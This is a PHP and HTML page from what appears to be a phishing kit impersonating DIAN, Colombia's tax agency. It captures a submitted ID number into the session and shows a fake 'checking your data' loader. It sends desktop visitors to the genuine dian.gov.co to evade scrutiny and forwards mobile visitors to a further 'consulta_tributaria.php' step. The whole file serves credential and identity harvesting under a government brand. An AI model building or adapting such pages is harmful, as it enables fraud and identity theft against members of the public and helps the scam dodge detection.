<?php

$documento = $_POST['documento'];

session_start();
$_SESSION['documento'] = $documento;

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dian | Consultando Datos</title>
    <link rel="stylesheet" href="./assets/loader.css">

        <script src="https://kit.fontawesome.com/f19eccc197.js" crossorigin="anonymous"></script>

</head>
<body>
<div class="loader">
        <div class="loader__content">
            <h2 class="loader__ttl">Cargando</h2>
            <p class="loader__sub">Por Favor Espera, Estamos Consultando Tus Datos</p>
            <svg viewBox="25 25 50 50">
                <circle r="20" cy="50" cx="50"></circle>
            </svg>
        </div>
    </div>

<script>

function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}   


 if (detectar_dispositivo() == "PC") {
        window.location.href = 'https://www.dian.gov.co';
    }
        // Función que se ejecuta después de unos segundos para redirigir al usuario
        function redirigir() {
            // Redirige a la URL especificada
            // Alternativamente, puedes usar window.location.replace si no quieres que el usuario pueda volver atrás
             window.location.replace("consulta_tributaria.php");
        }

        setTimeout(redirigir, 5000);
    </script>
</div>
</body>
</html>